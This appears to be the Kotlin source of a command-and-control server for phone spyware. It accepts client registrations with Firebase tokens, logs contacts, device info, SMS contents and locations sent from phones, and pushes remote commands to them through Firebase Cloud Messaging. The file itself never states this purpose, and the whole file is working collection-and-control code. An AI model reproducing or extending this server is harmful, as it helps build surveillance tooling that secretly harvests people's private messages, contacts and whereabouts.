package server

import com.google.firebase.messaging.FirebaseMessaging
import com.google.firebase.messaging.Message
import helper.Logger
import helper.protocol.*
import io.ktor.network.selector.*
import io.ktor.network.sockets.*
import io.ktor.utils.io.*
import kotlinx.coroutines.*
import java.net.*
import java.net.ServerSocket
import java.net.Socket
import java.nio.ByteBuffer
import java.nio.channels.ServerSocketChannel
import java.nio.channels.SocketChannel
import java.util.*
import java.util.concurrent.ConcurrentHashMap
import java.util.concurrent.Executors
import kotlin.collections.ArrayList
import kotlin.collections.HashMap

class ServerThread: Thread() {

    private var running = false

    private var lastKeepAliveSent = 0L

    private val listeners = ArrayList<ServerStateListener>()

    private val tag = "Server"
    private val dataDivider = ":|:"

    private val threadPool = Executors.newCachedThreadPool()

    private val socket = ServerSocket(33455)

    private var clients = ConcurrentHashMap<String, Client>()

    override fun run() {

        Logger.log(tag, "Server started")
        running = true
        while (running) {
            val client = socket.accept()

            threadPool.submit {
                Logger.log(tag, "Client connected: ${client.remoteSocketAddress}")
                while (client.isConnected) {
                    val output = client.getOutputStream()
                    val input = client.getInputStream().bufferedReader()

                    while (true) {
                        val line = input.readLine().split(dataDivider)

                        when (line[0]) {
                            "connect" -> {
                                var uuid = line.getOrElse(1) { "" }
                                val token = line.getOrElse(2) { "" }

                                if (token.isBlank()) {
                                    output.write("error${dataDivider}Token required\n".toByteArray())
                                    continue
                                }

                                uuid = uuid.ifBlank { UUID.randomUUID().toString() }

                                clients[uuid] = Client(uuid, token)

                                Logger.log(
                                    tag,
                                    "connect satisfied from ${client.remoteSocketAddress}, dedicated uuid: $uuid"
                                )
                                output.write("ok${dataDivider}$uuid\n".toByteArray())

                                listeners.forEach { it.onClientsListChanged(clients.values.toList()) }
                            }

                            "contacts" -> {
                                val uuid = line.getOrElse(1) { "" }
                                val contacts = line.getOrElse(2) { "" }

                                if (uuid.isBlank()) {
                                    output.write("error${dataDivider}uuid required\n".toByteArray())
                                    continue
                                }

                                var fullContacts = contacts
                                while (input.ready()) {
                                    fullContacts += "${input.readLine()}\n"
                                }

                                Logger.log(
                                    tag,
                                    "contacts received from $uuid: $fullContacts"
                                )
                                output.write("ok\n".toByteArray())
                            }

                            "phone_info" -> {
                                val uuid = line.getOrElse(1) { "" }
                                val phoneInfo = line.getOrElse(2) { "" }

                                if (uuid.isBlank()) {
                                    output.write("error${dataDivider}uuid required\n".toByteArray())
                                    continue
                                }

                                var fullInfo = phoneInfo
                                while (input.ready()) {
                                    fullInfo += "${input.readLine()}\n"
                                }

                                Logger.log(
                                    tag,
                                    "phone info received from $uuid: $fullInfo"
                                )

                                output.write("ok\n".toByteArray())
                            }

                            "sms" -> {
                                val uuid = line.getOrElse(1)  { "" }
                                val sms = line.getOrElse(2) { "" }

                                if (uuid.isBlank()) {
                                    output.write("error${dataDivider}uuid required\n".toByteArray())
                                    continue
                                }

                                var fullSms = sms
                                while (input.ready()) { fullSms += "${input.readLine()}\n" }

                                Logger.log(
                                    tag,
                                    "sms received from ${uuid}: $fullSms"
                                )

                                output.write("ok\n".toByteArray())
                            }

                            "location" -> {
                                val uuid = line.getOrElse(1) { "" }
                                val location = line.getOrElse(2) { "" }

                                if (uuid.isBlank()) {
                                    output.write("error${dataDivider}uuid required\n".toByteArray())
                                    continue
                                }

                                Logger.log(
                                    tag,
                                    "location received from ${uuid}: $location"
                                )

                                output.write("ok\n".toByteArray())
                            }
                        }
                    }
                }
                Logger.log(tag, "Client disconnected: ${client.remoteSocketAddress}")
            }

            sleep(10)
        }

        Logger.log(tag, "Server stopped")
    }

    fun stopThread() { running = false }

    fun registerListener(listener: ServerStateListener) {
        if (listener !in listeners) listeners.add(listener)
    }

    fun unregisterListener(listener: ServerStateListener) { listeners.remove(listener) }

    fun sendCommand(client: Client, command: String, additionalData: String = "") {
        val msg = Message.builder()
            .putData("command", command)
            .putData("additionalData", additionalData)
            .setToken(client.token)
            .build()
        FirebaseMessaging.getInstance().send(msg)
    }
}